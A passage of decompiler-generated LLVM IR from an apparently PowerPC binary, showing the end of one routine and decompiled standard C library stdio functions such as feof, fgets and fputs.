  store i32 %v0_1000454c, i32* %v3_1000454c, align 4
  br label %dec_label_pc_10004550

dec_label_pc_10004550:                            ; preds = %dec_label_pc_100044e8, %dec_label_pc_10004544
  %v0_10004550 = load i32, i32* @r26, align 4
  %tmp62 = icmp slt i32 %v0_10004550, 1
  br i1 %tmp62, label %dec_label_pc_1000462c, label %dec_label_pc_10004558

dec_label_pc_10004558:                            ; preds = %dec_label_pc_10004550
  store i32 0, i32* @r27, align 4
  br label %dec_label_pc_1000455c

dec_label_pc_1000455c:                            ; preds = %dec_label_pc_10004614, %dec_label_pc_10004558
  %v0_10004584 = phi i32 [ 0, %dec_label_pc_10004558 ], [ %v1_10004618, %dec_label_pc_10004614 ]
  %v2_1000455c = icmp sgt i32 %v0_10004584, 2
  br i1 %v2_1000455c, label %dec_label_pc_10004580, label %dec_label_pc_10004564

dec_label_pc_10004564:                            ; preds = %dec_label_pc_1000455c
  %v1_10004564 = mul i32 %v0_10004584, 4
  store i32 %v1_10004564, i32* %r0.global-to-local, align 4
  %v0_10004568 = load i32, i32* @r1, align 4
  %v2_10004568 = add i32 %v0_10004568, %v1_10004564
  store i32 %v2_10004568, i32* %r9.global-to-local, align 4
  %v1_1000456c = add i32 %v2_10004568, 20
  %v2_1000456c = inttoptr i32 %v1_1000456c to i32*
  %v3_1000456c = load i32, i32* %v2_1000456c, align 4
  store i32 %v3_1000456c, i32* %r0.global-to-local, align 4
  %v1_10004570 = load i32, i32* @r28, align 4
  %v2_10004570 = add i32 %v1_10004570, %v0_10004584
  store i32 %v2_10004570, i32* %r9.global-to-local, align 4
  %v1_10004574 = urem i32 %v3_1000456c, 256
  store i32 %v1_10004574, i32* %r11.global-to-local, align 4
  %v1_10004578 = trunc i32 %v3_1000456c to i8
  %v3_10004578 = add i32 %v2_10004570, 36
  %v4_10004578 = inttoptr i32 %v3_10004578 to i8*
  store i8 %v1_10004578, i8* %v4_10004578, align 1
  %v0_1000458c.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000458c

dec_label_pc_10004580:                            ; preds = %dec_label_pc_1000455c
  %v2_10004584 = add i32 %v0_10004584, %stack_var_-84.3
  store i32 %v2_10004584, i32* %r9.global-to-local, align 4
  %v1_10004588 = add i32 %v2_10004584, -2
  store i32 %v1_10004588, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000458c

dec_label_pc_1000458c:                            ; preds = %dec_label_pc_10004564, %dec_label_pc_10004580
  %v0_100045ac = phi i32 [ %v0_1000458c.pre, %dec_label_pc_10004564 ], [ %v1_10004588, %dec_label_pc_10004580 ]
  %v1_1000458c = load i32, i32* @r26, align 4
  %v3_1000458c = icmp sgt i32 %v0_100045ac, %v1_1000458c
  br i1 %v3_1000458c, label %dec_label_pc_10004594, label %dec_label_pc_100045a0

dec_label_pc_10004594:                            ; preds = %dec_label_pc_1000458c
  %v2_10004594 = icmp sgt i32 %v0_100045ac, 9
  br i1 %v2_10004594, label %dec_label_pc_10004688, label %dec_label_pc_1000459c

dec_label_pc_1000459c:                            ; preds = %dec_label_pc_10004594
  store i32 %v0_100045ac, i32* @r26, align 4
  br label %dec_label_pc_100045a0

dec_label_pc_100045a0:                            ; preds = %dec_label_pc_1000458c, %dec_label_pc_1000459c
  store i32 %v2_1000423c.pre-phi, i32* %r9.global-to-local, align 4
  %v0_100045a4 = load i32, i32* @r27, align 4
  %v1_100045a4 = mul i32 %v0_100045a4, 4
  store i32 %v1_100045a4, i32* %r0.global-to-local, align 4
  %v2_100045a8 = add i32 %v1_100045a4, %v2_1000423c.pre-phi
  %v3_100045a8 = inttoptr i32 %v2_100045a8 to i32*
  %v4_100045a8 = load i32, i32* %v3_100045a8, align 4
  store i32 %v4_100045a8, i32* @r31, align 4
  %v1_100045ac = add i32 %v0_100045ac, -1
  store i32 %v1_100045ac, i32* @r25, align 4
  %v1_100045b0 = mul i32 %v1_100045ac, 4
  %v3_100045b4 = icmp eq i32 %v4_100045a8, 8
  %v1_100045b8 = load i32, i32* @r28, align 4
  %v2_100045b8 = add i32 %v1_100045b8, %v1_100045b0
  store i32 %v2_100045b8, i32* %r9.global-to-local, align 4
  %v1_100045bc = add i32 %v2_100045b8, 40
  %v2_100045bc = inttoptr i32 %v1_100045bc to i32*
  %v3_100045bc = load i32, i32* %v2_100045bc, align 4
  store i32 %v3_100045bc, i32* %r3.global-to-local, align 4
  br i1 %v3_100045b4, label %dec_label_pc_10004614, label %dec_label_pc_100045c4

dec_label_pc_100045c4:                            ; preds = %dec_label_pc_100045a0
  %v3_100045c4 = icmp eq i32 %v3_100045bc, 8
  br i1 %v3_100045c4, label %dec_label_pc_100045fc, label %dec_label_pc_100045cc

dec_label_pc_100045cc:                            ; preds = %dec_label_pc_100045c4
  %v4_100045cc = icmp eq i32 %v3_100045bc, %v4_100045a8
  br i1 %v4_100045cc, label %dec_label_pc_100045fc, label %dec_label_pc_100045d4

dec_label_pc_100045d4:                            ; preds = %dec_label_pc_100045cc
  %v1_100045d4 = call i32 @_promoted_size(i32 %v3_100045bc)
  store i32 %v1_100045d4, i32* @r29, align 4
  %v0_100045dc = load i32, i32* @r31, align 4
  store i32 %v0_100045dc, i32* %r3.global-to-local, align 4
  %v1_100045e0 = call i32 @_promoted_size(i32 %v0_100045dc)
  store i32 %v1_100045e0, i32* %r3.global-to-local, align 4
  %v0_100045ec = call i32 @__asm_mfcr()
  store i32 %v0_100045ec, i32* %r3.global-to-local, align 4
  store i32 %v0_100045ec, i32* %r0.global-to-local, align 4
  %v1_100045f0 = call i32 @__asm_rlwinm(i32 %v0_100045ec, i32 31, i32 31, i32 31)
  store i32 %v1_100045f0, i32* %r0.global-to-local, align 4
  %v3_100045f4 = icmp eq i32 %v1_100045f0, 0
  br i1 %v3_100045f4, label %dec_label_pc_10004614, label %dec_label_pc_100045d4.dec_label_pc_100045fc_crit_edge

dec_label_pc_100045d4.dec_label_pc_100045fc_crit_edge: ; preds = %dec_label_pc_100045d4
  %v0_10004600.pre = load i32, i32* @r27, align 4
  %v0_10004608.pre = load i32, i32* @r25, align 4
  %v1_1000460c.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_100045fc

dec_label_pc_100045fc:                            ; preds = %dec_label_pc_100045d4.dec_label_pc_100045fc_crit_edge, %dec_label_pc_100045cc, %dec_label_pc_100045c4
  %v1_1000460c = phi i32 [ %v1_1000460c.pre, %dec_label_pc_100045d4.dec_label_pc_100045fc_crit_edge ], [ %v1_100045b8, %dec_label_pc_100045cc ], [ %v1_100045b8, %dec_label_pc_100045c4 ]
  %v0_10004608 = phi i32 [ %v0_10004608.pre, %dec_label_pc_100045d4.dec_label_pc_100045fc_crit_edge ], [ %v1_100045ac, %dec_label_pc_100045cc ], [ %v1_100045ac, %dec_label_pc_100045c4 ]
  %v0_10004600 = phi i32 [ %v0_10004600.pre, %dec_label_pc_100045d4.dec_label_pc_100045fc_crit_edge ], [ %v0_100045a4, %dec_label_pc_100045cc ], [ %v0_100045a4, %dec_label_pc_100045c4 ]
  store i32 %v2_1000423c.pre-phi, i32* %r9.global-to-local, align 4
  %v1_10004600 = mul i32 %v0_10004600, 4
  store i32 %v1_10004600, i32* %r0.global-to-local, align 4
  %v2_10004604 = add i32 %v1_10004600, %v2_1000423c.pre-phi
  %v3_10004604 = inttoptr i32 %v2_10004604 to i32*
  %v4_10004604 = load i32, i32* %v3_10004604, align 4
  store i32 %v4_10004604, i32* %r0.global-to-local, align 4
  %v1_10004608 = mul i32 %v0_10004608, 4
  %v2_1000460c = add i32 %v1_10004608, %v1_1000460c
  store i32 %v2_1000460c, i32* %r9.global-to-local, align 4
  %v2_10004610 = add i32 %v2_1000460c, 40
  %v3_10004610 = inttoptr i32 %v2_10004610 to i32*
  store i32 %v4_10004604, i32* %v3_10004610, align 4
  br label %dec_label_pc_10004614

dec_label_pc_10004614:                            ; preds = %dec_label_pc_100045d4, %dec_label_pc_100045a0, %dec_label_pc_100045fc
  %v0_10004614 = load i32, i32* @r28, align 4
  %v1_10004614 = add i32 %v0_10004614, 28
  %v2_10004614 = inttoptr i32 %v1_10004614 to i32*
  %v3_10004614 = load i32, i32* %v2_10004614, align 4
  %v0_10004618 = load i32, i32* @r27, align 4
  %v1_10004618 = add i32 %v0_10004618, 1
  store i32 %v1_10004618, i32* @r27, align 4
  %v1_1000461c = add i32 %v3_10004614, 2
  store i32 %v1_1000461c, i32* %r9.global-to-local, align 4
  %v2_10004620 = icmp slt i32 %v1_10004618, %v1_1000461c
  br i1 %v2_10004620, label %dec_label_pc_1000455c, label %dec_label_pc_10004644

dec_label_pc_1000462c:                            ; preds = %dec_label_pc_10004550
  %v0_1000462c = load i32, i32* @r28, align 4
  %v1_1000462c = add i32 %v0_1000462c, 28
  %v2_1000462c = inttoptr i32 %v1_1000462c to i32*
  %v3_1000462c = load i32, i32* %v2_1000462c, align 4
  store i32 %v3_1000462c, i32* %r5.global-to-local, align 4
  %v1_10004630 = add i32 %v0_1000462c, 40
  store i32 %v1_10004630, i32* @r3, align 4
  %v0_10004634 = load i32, i32* @r7, align 4
  %v1_10004634 = trunc i32 %v0_10004634 to i8
  %v3_10004634 = add i32 %v0_1000462c, 38
  %v4_10004634 = inttoptr i32 %v3_10004634 to i8*
  store i8 %v1_10004634, i8* %v4_10004634, align 1
  %v2_10004638 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_10004638, i32* @r4, align 4
  %v0_1000463c = load i32, i32* %r5.global-to-local, align 4
  %v1_1000463c = mul i32 %v0_1000463c, 4
  store i32 %v1_1000463c, i32* @r5, align 4
  store i32 268453444, i32* @lr, align 4
  %v0_10004640 = call i32 @memcpy()
  store i32 %v0_10004640, i32* %r3.global-to-local, align 4
  %v0_10004644.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_10004644

dec_label_pc_10004644:                            ; preds = %dec_label_pc_10004614, %dec_label_pc_1000462c
  %v0_10004644 = phi i32 [ %v0_10004644.pre, %dec_label_pc_1000462c ], [ %v0_10004614, %dec_label_pc_10004614 ]
  %v1_10004644 = add i32 %v0_10004644, 16
  %v2_10004644 = inttoptr i32 %v1_10004644 to i32*
  %v3_10004644 = load i32, i32* %v2_10004644, align 4
  store i32 %v3_10004644, i32* %r0.global-to-local, align 4
  %v0_10004648 = load i32, i32* @r26, align 4
  %v2_10004648 = add i32 %v0_10004644, 24
  %v3_10004648 = inttoptr i32 %v2_10004648 to i32*
  store i32 %v0_10004648, i32* %v3_10004648, align 4
  %v0_1000464c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000464c = and i32 %v0_1000464c, 128
  store i32 %v1_1000464c, i32* %r9.global-to-local, align 4
  %v3_1000464c = icmp eq i32 %v1_1000464c, 0
  br i1 %v3_1000464c, label %dec_label_pc_10004654, label %dec_label_pc_10004660

dec_label_pc_10004654:                            ; preds = %dec_label_pc_10004644
  %v0_10004654 = load i32, i32* @r30, align 4
  %v1_10004654 = add i32 %v0_10004654, 1
  store i32 %v1_10004654, i32* %r0.global-to-local, align 4
  %v1_10004658 = load i32, i32* @r28, align 4
  %v2_10004658 = inttoptr i32 %v1_10004658 to i32*
  store i32 %v1_10004654, i32* %v2_10004658, align 4
  br label %dec_label_pc_10004678

dec_label_pc_10004660:                            ; preds = %dec_label_pc_10004644
  %v2_10004660 = ptrtoint i32* %stack_var_-80 to i32
  store i32 %v2_10004660, i32* %r0.global-to-local, align 4
  %v0_10004664 = load i32, i32* @r28, align 4
  %v1_10004664 = inttoptr i32 %v0_10004664 to i32*
  %v2_10004664 = load i32, i32* %v1_10004664, align 4
  %v1_10004668 = load i32, i32* @r30, align 4
  %v2_10004668 = sub i32 %v1_10004668, %v2_10004660
  %v1_1000466c = mul i32 %v2_10004668, 4
  store i32 %v1_1000466c, i32* %r0.global-to-local, align 4
  %v2_10004670 = add i32 %v1_1000466c, %v2_10004664
  store i32 %v2_10004670, i32* %r9.global-to-local, align 4
  store i32 %v2_10004670, i32* %v1_10004664, align 4
  br label %dec_label_pc_10004678

dec_label_pc_10004678:                            ; preds = %dec_label_pc_10004654, %dec_label_pc_10004660
  %v0_10004678 = load i32, i32* @r28, align 4
  %v1_10004678 = add i32 %v0_10004678, 28
  %v2_10004678 = inttoptr i32 %v1_10004678 to i32*
  %v3_10004678 = load i32, i32* %v2_10004678, align 4
  store i32 %v3_10004678, i32* %r9.global-to-local, align 4
  %v1_1000467c = add i32 %v3_10004678, 2
  br label %dec_label_pc_10004688

dec_label_pc_10004688:                            ; preds = %dec_label_pc_100041ec, %dec_label_pc_1000439c, %dec_label_pc_100042c0, %dec_label_pc_10004390, %dec_label_pc_100043b8, %dec_label_pc_100042f4, %dec_label_pc_10004594, %dec_label_pc_10004444, %dec_label_pc_10004538, %dec_label_pc_10004678
  %storemerge2 = phi i32 [ %v1_1000467c, %dec_label_pc_10004678 ], [ -1, %dec_label_pc_10004538 ], [ -1, %dec_label_pc_10004444 ], [ -1, %dec_label_pc_10004594 ], [ -1, %dec_label_pc_100042f4 ], [ -1, %dec_label_pc_100043b8 ], [ -1, %dec_label_pc_10004390 ], [ -1, %dec_label_pc_100042c0 ], [ -1, %dec_label_pc_1000439c ], [ -1, %dec_label_pc_100041ec ]
  store i32 %storemerge2, i32* %r3.global-to-local, align 4
  store i32 %v0_10004184, i32* %r0.global-to-local, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i32 %v1_1000466c, { 1, 0 }
  uselistorder i32 %v0_10004644, { 1, 0 }
  uselistorder i32 %v1_10004618, { 1, 2, 0 }
  uselistorder i32 %v1_10004600, { 1, 0 }
  uselistorder i32 %v0_100045ec, { 0, 2, 1 }
  uselistorder i32 %v3_100045bc, { 1, 0, 2, 3 }
  uselistorder i32 %v1_100045b8, { 1, 2, 0 }
  uselistorder i32 %v1_100045ac, { 1, 2, 0, 3 }
  uselistorder i32 %v1_100045a4, { 1, 0 }
  uselistorder i32 %v0_100045a4, { 1, 2, 0 }
  uselistorder i32 %v3_1000456c, { 1, 0, 2 }
  uselistorder i32 %v1_10004564, { 1, 0 }
  uselistorder i32 %v0_10004584, { 1, 2, 0, 3 }
  uselistorder i32 %v1_100044dc, { 1, 2, 0 }
  uselistorder i32 %v1_100044b4, { 2, 1, 0 }
  uselistorder i32 %v1_100044a0, { 0, 2, 3, 1 }
  uselistorder i32 %v1_10004484, { 1, 0, 2 }
  uselistorder i32 %v1_10004450, { 2, 3, 1, 0 }
  uselistorder i32 %v1_1000440c, { 0, 2, 3, 1 }
  uselistorder i32 %v0_100043d0, { 0, 3, 2, 1 }
  uselistorder i32 %v1_100043bc, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_1000432c, { 0, 1, 3, 2 }
  uselistorder i32 %v0_10004328, { 1, 0 }
  uselistorder i32 %v0_10004340, { 1, 2, 4, 3, 5, 0 }
  uselistorder i32 %stack_var_-84.2, { 1, 0 }
  uselistorder i32 %v0_100042a4, { 0, 1, 6, 4, 3, 5, 2, 7 }
  uselistorder i32 %v2_1000429c, { 1, 0 }
  uselistorder i32 %v1_1000428c, { 1, 0 }
  uselistorder i32 %v3_10004284, { 1, 0, 2 }
  uselistorder i32 %v0_10004300, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_100042d0, { 0, 1, 3, 2, 4, 5, 6, 7, 9, 8 }
  uselistorder i32 %v0_10004260, { 0, 1, 3, 2 }
  uselistorder i32 %v0_10004248, { 1, 0 }
  uselistorder i32 %v2_1000423c.pre-phi, { 0, 4, 1, 3, 2 }
  uselistorder i32 %v1_1000421c, { 1, 0 }
  uselistorder i32 %v1_10004204, { 1, 2, 0 }
  uselistorder i32 %v0_100041f8, { 2, 1, 0 }
  uselistorder i32* %stack_var_-104, { 2, 0, 1 }
  uselistorder i32* %stack_var_-96, { 2, 0, 1 }
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0, 28, 29, 30, 31, 32, 33, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* %r8.global-to-local, { 5, 4, 6, 7, 8, 9, 0, 1, 2, 3 }
  uselistorder i32* %r6.global-to-local, { 4, 5, 6, 2, 0, 3, 1 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 3, 4, 8, 6, 7, 5, 2 }
  uselistorder i32* %r4.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32* %r3.global-to-local, { 3, 2, 0, 5, 4, 6, 9, 7, 8, 1 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 2, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 3, 4, 5, 6, 7, 8 }
  uselistorder i32* %r10.global-to-local, { 7, 8, 9, 10, 1, 2, 3, 11, 12, 0, 4, 5, 6 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 29, 30, 28, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder i32 (i32)* @_promoted_size, { 1, 0 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_1000bd24.368 to i32), { 3, 0, 1, 2, 4 }
  uselistorder i32 ptrtoint ([9 x i8]* @global_var_1000bce4.367 to i32), { 1, 0, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i8 36, { 1, 0 }
  uselistorder i8 37, { 0, 3, 4, 2, 5, 1 }
  uselistorder i32* %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10004688, { 9, 6, 8, 7, 4, 1, 3, 5, 2, 0 }
  uselistorder label %dec_label_pc_10004678, { 1, 0 }
  uselistorder label %dec_label_pc_10004644, { 1, 0 }
  uselistorder label %dec_label_pc_10004614, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100045a0, { 1, 0 }
  uselistorder label %dec_label_pc_1000458c, { 1, 0 }
  uselistorder label %dec_label_pc_10004550, { 1, 0 }
  uselistorder label %dec_label_pc_10004498, { 1, 0 }
  uselistorder label %dec_label_pc_10004444, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100043f4, { 1, 0 }
  uselistorder label %dec_label_pc_100043c8, { 1, 0 }
  uselistorder label %dec_label_pc_1000437c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10004378, { 1, 0 }
  uselistorder label %dec_label_pc_100042ec, { 1, 0 }
  uselistorder label %dec_label_pc_100042e4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10004284, { 1, 0 }
  uselistorder label %dec_label_pc_10004280, { 1, 0 }
  uselistorder label %dec_label_pc_1000426c, { 1, 0 }
  uselistorder label %dec_label_pc_1000424c, { 1, 0 }
  uselistorder label %dec_label_pc_10004248, { 1, 0 }
  uselistorder label %dec_label_pc_1000422c, { 1, 0 }
}

define i32 @feof(i32 %arg1) local_unnamed_addr {
entry:
  %cr4_eq.global-to-local = alloca i1, align 1
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_100046a4 = call i32 @__asm_mfcr()
  store i32 %v0_100046a4, i32* %r31.global-to-local, align 4
  %v2_100046c8 = add i32 %v0_100046a4, 52
  %v3_100046c8 = inttoptr i32 %v2_100046c8 to i32*
  %v4_100046c8 = load i32, i32* %v3_100046c8, align 4
  %v2_100046cc = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_100046cc, i32* @r3, align 4
  %v3_100046d0 = icmp eq i32 %v4_100046c8, 0
  store i1 %v3_100046d0, i1* %cr4_eq.global-to-local, align 1
  br i1 %v3_100046d0, label %dec_label_pc_100046e4, label %dec_label_pc_100046e4.thread

dec_label_pc_100046e4.thread:                     ; preds = %entry
  %v1_100046ec3 = inttoptr i32 %v0_100046a4 to i16*
  %v2_100046ec4 = load i16, i16* %v1_100046ec3, align 2
  %v3_100046ec5 = zext i16 %v2_100046ec4 to i32
  store i32 %v3_100046ec5, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_100046f8

dec_label_pc_100046e4:                            ; preds = %entry
  %v0_100046d8 = call i32 @__pthread_return_void()
  %v0_100046e0 = call i32 @__pthread_return_0()
  %v0_100046ec.pre = load i32, i32* %r31.global-to-local, align 4
  %v0_100046f0.pre = load i1, i1* %cr4_eq.global-to-local, align 1
  store i32 %v2_100046cc, i32* @r3, align 4
  %v1_100046ec = inttoptr i32 %v0_100046ec.pre to i16*
  %v2_100046ec = load i16, i16* %v1_100046ec, align 2
  %v3_100046ec = zext i16 %v2_100046ec to i32
  store i32 %v3_100046ec, i32* %r31.global-to-local, align 4
  br i1 %v0_100046f0.pre, label %dec_label_pc_100046f4, label %dec_label_pc_100046f8

dec_label_pc_100046f4:                            ; preds = %dec_label_pc_100046e4
  %v0_100046f4 = call i32 @__pthread_return_void()
  br label %dec_label_pc_100046f8

dec_label_pc_100046f8:                            ; preds = %dec_label_pc_100046e4.thread, %dec_label_pc_100046e4, %dec_label_pc_100046f4
  %v3_100046ec6 = phi i32 [ %v3_100046ec5, %dec_label_pc_100046e4.thread ], [ %v3_100046ec, %dec_label_pc_100046e4 ], [ %v3_100046ec, %dec_label_pc_100046f4 ]
  %v1_100046fc = call i32 @__asm_rlwinm(i32 %v3_100046ec6, i32 0, i32 29, i32 29)
  %v1_1000470c = call %0 @__asm_mtcrf(i32 8, i32 %v0_100046a4)
  %v9_1000470c = extractvalue %0 %v1_1000470c, 7
  store i4 %v9_1000470c, i4* @cr4, align 1
  ret i32 %v1_100046fc

; uselistorder directives
  uselistorder i32 %v0_100046a4, { 3, 0, 1, 2 }
  uselistorder i32* %r31.global-to-local, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_100046f8, { 2, 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cr4_eq.global-to-local = alloca i1, align 1
  %r28.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_10004720 = call i32 @__asm_mfcr()
  store i32 %arg2, i32* %r30.global-to-local, align 4
  store i32 %arg3, i32* %r31.global-to-local, align 4
  store i32 %v0_10004720, i32* %r28.global-to-local, align 4
  %v1_10004744 = add i32 %arg3, 52
  %v2_10004744 = inttoptr i32 %v1_10004744 to i32*
  %v3_10004744 = load i32, i32* %v2_10004744, align 4
  %v2_10004748 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10004748, i32* @r3, align 4
  %v3_10004754 = icmp eq i32 %v3_10004744, 0
  store i1 %v3_10004754, i1* %cr4_eq.global-to-local, align 1
  br i1 %v3_10004754, label %dec_label_pc_1000475c, label %dec_label_pc_10004768

dec_label_pc_1000475c:                            ; preds = %entry
  %v0_1000475c = call i32 @__pthread_return_void()
  %v0_10004764 = call i32 @__pthread_return_0()
  %v0_10004768.pre = load i32, i32* %r30.global-to-local, align 4
  %v0_1000476c.pre = load i32, i32* %r31.global-to-local, align 4
  %v0_10004770.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_10004768

dec_label_pc_10004768:                            ; preds = %entry, %dec_label_pc_1000475c
  %v0_10004770 = phi i32 [ %v0_10004720, %entry ], [ %v0_10004770.pre, %dec_label_pc_1000475c ]
  %v0_1000476c = phi i32 [ %arg3, %entry ], [ %v0_1000476c.pre, %dec_label_pc_1000475c ]
  %v0_10004768 = phi i32 [ %arg2, %entry ], [ %v0_10004768.pre, %dec_label_pc_1000475c ]
  store i32 268453752, i32* @lr, align 4
  %v3_10004774 = inttoptr i32 %v0_10004770 to i8*
  %v4_10004774 = call i32 @__GI_fgets_unlocked(i8* %v3_10004774, i32 %v0_10004768, i32 %v0_1000476c)
  store i32 %v4_10004774, i32* @r31, align 4
  store i32 %v2_10004748, i32* @r3, align 4
  %v0_10004784 = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_10004784, label %dec_label_pc_10004788, label %dec_label_pc_1000478c

dec_label_pc_10004788:                            ; preds = %dec_label_pc_10004768
  %v0_10004788 = call i32 @__pthread_return_void()
  %v0_10004790.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000478c

dec_label_pc_1000478c:                            ; preds = %dec_label_pc_10004768, %dec_label_pc_10004788
  %v0_10004790 = phi i32 [ %v4_10004774, %dec_label_pc_10004768 ], [ %v0_10004790.pre, %dec_label_pc_10004788 ]
  %v1_100047a0 = call %0 @__asm_mtcrf(i32 8, i32 %v0_10004720)
  %v9_100047a0 = extractvalue %0 %v1_100047a0, 7
  store i4 %v9_100047a0, i4* @cr4, align 1
  ret i32 %v0_10004790

; uselistorder directives
  uselistorder i32 %v0_10004720, { 1, 0, 2 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000478c, { 1, 0 }
  uselistorder label %dec_label_pc_10004768, { 1, 0 }
}

define i32 @__GI_fputs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cr4_eq.global-to-local = alloca i1, align 1
  %r29.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_100047b4 = call i32 @__asm_mfcr()
  store i32 %arg2, i32* %r31.global-to-local, align 4
  store i32 %v0_100047b4, i32* %r29.global-to-local, align 4
  %v2_100047d4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_100047d4, i32* @r3, align 4
  %v1_100047d8 = add i32 %arg2, 52
  %v2_100047d8 = inttoptr i32 %v1_100047d8 to i32*
  %v3_100047d8 = load i32, i32* %v2_100047d8, align 4
  %v3_100047e4 = icmp eq i32 %v3_100047d8, 0
  store i1 %v3_100047e4, i1* %cr4_eq.global-to-local, align 1
  br i1 %v3_100047e4, label %dec_label_pc_100047ec, label %dec_label_pc_100047f8

dec_label_pc_100047ec:                            ; preds = %entry
  %v0_100047ec = call i32 @__pthread_return_void()
  %v0_100047f4 = call i32 @__pthread_return_0()
  %v0_100047f8.pre = load i32, i32* %r31.global-to-local, align 4
  %v0_100047fc.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_100047f8

dec_label_pc_100047f8:                            ; preds = %entry, %dec_label_pc_100047ec
  %v0_100047fc = phi i32 [ %v0_100047b4, %entry ], [ %v0_100047fc.pre, %dec_label_pc_100047ec ]
  %v0_100047f8 = phi i32 [ %arg2, %entry ], [ %v0_100047f8.pre, %dec_label_pc_100047ec ]
  store i32 268453892, i32* @lr, align 4
  %v2_10004800 = call i32 @__GI_fputs_unlocked(i32 %v0_100047fc, i32 %v0_100047f8)
  store i32 %v2_10004800, i32* %r31.global-to-local, align 4
  store i32 %v2_100047d4, i32* @r3, align 4
  %v0_10004810 = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_10004810, label %dec_label_pc_10004814, label %dec_label_pc_10004818

dec_label_pc_10004814:                            ; preds = %dec_label_pc_100047f8
  %v0_10004814 = call i32 @__pthread_return_void()
  %v0_1000481c.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10004818

dec_label_pc_10004818:                            ; preds = %dec_label_pc_100047f8, %dec_label_pc_10004814
  %v0_1000481c = phi i32 [ %v2_10004800, %dec_label_pc_100047f8 ], [ %v0_1000481c.pre, %dec_label_pc_10004814 ]
  %v1_1000482c = call %0 @__asm_mtcrf(i32 8, i32 %v0_100047b4)
  %v9_1000482c = extractvalue %0 %v1_1000482c, 7
  store i4 %v9_1000482c, i4* @cr4, align 1
  ret i32 %v0_1000481c

; uselistorder directives
  uselistorder i32 %v0_100047b4, { 1, 0, 2 }
  uselistorder i32 (i32, i32)* @__GI_fputs_unlocked, { 1, 0 }
  uselistorder label %dec_label_pc_10004818, { 1, 0 }
  uselistorder label %dec_label_pc_100047f8, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10006d28.342 to i32), i32* @r31, align 4
  store i32 ptrtoint (i32* @global_var_1001d4b4.343 to i32), i32* @r29, align 4
  %v2_1000485c = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1000485c, i32* @r3, align 4
  %v0_10004864 = call i32 @__pthread_return_void()
  %v0_1000486c = call i32 @__pthread_return_0()
  %v3_10004874 = load i32, i32* @global_var_1001d854.344, align 4
  %v3_10004878 = icmp eq i32 %v3_10004874, 1
  br i1 %v3_10004878, label %dec_label_pc_10004880, label %dec_label_pc_10004928

dec_label_pc_10004880:                            ; preds = %entry
  %v3_10004884 = load i32, i32* @global_var_1001d858.345, align 4
  %tmp7 = icmp slt i32 %v3_10004884, 1
  br i1 %tmp7, label %dec_label_pc_10004928, label %dec_label_pc_10004890

dec_label_pc_10004890:                            ; preds = %dec_label_pc_10004880
  %v2_1000489c = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1000489c, i32* @r3, align 4
  store i32 0, i32* @r30, align 4
  %v0_100048a8 = call i32 @__pthread_return_void()
  %v0_100048b0 = call i32 @__pthread_return_0()
  %storemerge8 = load i32, i32* bitcast (i32** @global_var_1001d7f4.350 to i32*), align 4
  store i32 %storemerge8, i32* @r29, align 4
  %v3_1000490811 = icmp eq i32 %storemerge8, 0
  %v0_1000490c12 = load i32, i32* @r30, align 4
  br i1 %v3_1000490811, label %dec_label_pc_10004914, label %dec_label_pc_100048c0

dec_label_pc_100048c0:                            ; preds = %dec_label_pc_10004890, %dec_label_pc_10004908.backedge
